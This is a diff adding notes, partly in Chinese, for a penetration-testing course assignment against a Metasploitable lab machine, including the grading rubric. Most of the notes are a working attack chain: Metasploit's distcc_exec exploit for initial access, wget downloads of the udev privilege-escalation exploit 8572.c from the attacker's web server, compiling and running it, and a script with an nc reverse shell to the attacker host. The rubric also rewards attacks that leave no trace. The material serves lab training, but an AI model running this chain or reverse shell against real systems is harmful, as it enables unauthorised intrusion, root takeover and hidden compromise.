@@ -32,3 +32,68 @@ https://blcklstdbb.gitbooks.io/hackmd/content/lesson-2-samba-exploit.html
 
 
 
+### problem2
+
+Selected two CVEs, present in Metasploitable, to perform code
+injection and privilege escalation 特权提升, but did not build them into
+a complete attack (10 points out of 50).
+\2) The attack was built properly and completely (and is described
+in the text document deliverable), but does not work (20 points
+out of 50).
+\3) The attack was built and implemented properly, but the script
+needs tweaks or fixes to run on stock Kali Linux (35 points out
+of 50).
+\4) The attack was built properly, the script runs and completes the
+assignment (45 points out of 50)
+\5) Same as above, and the attack leaves no trace (filesystem
+permissions, additional files…) (50 points out of 50)  
+
+```bash
+
+msfconsole
+use exploit/unix/misc/distcc_exec
+set RHOST 192.168.23.132
+set payload 0
+exploit -z
+
+sessions -l
+sessions -i 1
+
+
+```
+
+怎么看是否是privileged process?
+
+distcc就不是特权进程。 
+
+
+
+
+
+
+
+```bash
+uname -a
+lsb_release -a
+searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6
+less /usr/share/exploitdb/exploits/linux/local/8572.c
+service apache2 restart
+sudo ln -s /usr/share/exploitdb/exploits/linux/local/8572.c /var/www/html/
+sudo nano /var/www/html/run
+#!/bin/bash
+nc 192.168.23.131 12345 -e /bin/bash
+
+msfconsole
+use exploit/unix/misc/distcc_exec
+set RHOST 192.168.23.132
+set LHOST 192.168.23.131
+set payload 5
+exploit 
+
+wget http://192.168.23.131/run
+wget http://192.168.23.131/8572.c
+gcc -o exploit 8572.c # On Kali, in your low-privilege shell, execute these commands to compile the exploit file and list files.
+ps aux | grep udev
+./exploit 2737
+```
+
